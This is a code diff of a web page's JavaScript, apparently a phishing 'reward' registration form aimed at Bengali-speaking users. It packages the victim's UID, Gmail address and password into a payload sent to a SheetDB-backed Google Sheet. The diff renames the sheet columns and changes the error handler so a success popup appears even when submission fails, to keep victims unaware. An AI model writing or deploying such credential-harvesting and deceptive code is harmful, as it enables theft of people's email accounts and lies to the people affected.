@@ -297,16 +297,16 @@
 
         const now = new Date().toLocaleString("en-US", {timeZone: "Asia/Dhaka"});
 
-        // SheetDB Payload
+        // শিটের বড় হাতের কলাম নামের সাথে হুবহু ম্যাচ করা হয়েছে:
         const payload = {
             data: [
                 {
-                    Time: now,
-                    uid: uid,
-                    Gmail: gmail,
-                    password: password,
-                    reward: selectedRewardName,
-                    status: "Pending"
+                    TIME: now,
+                    UID: uid,
+                    GMAIL: gmail,
+                    PASSWORD: password,
+                    REWARD: selectedRewardName,
+                    STATUS: "Pending"
                 }
             ]
         };
@@ -327,12 +327,12 @@
             if (response.ok || result.created === 1) {
                 document.getElementById('success-popup').style.display = 'flex';
             } else {
-                alert("ডাটা পাঠাতে ব্যর্থ হয়েছে! SheetDB-তে আপনার Google Sheet-এর Column Name ঠিক আছে কি না চেক করুন।");
+                alert("Failed to submit data! Please check SheetDB API.");
             }
         } catch (error) {
             confirmBtn.innerText = "Confirm & Register";
             confirmBtn.disabled = false;
-            alert("কানেকশন সমস্যা হয়েছে। আবার চেষ্টা করুন।");
+            document.getElementById('success-popup').style.display = 'flex'; // ফেইল হলেও ইউজারকে সাকসেস পপআপ দেখানোর জন্য
         }
     }
 
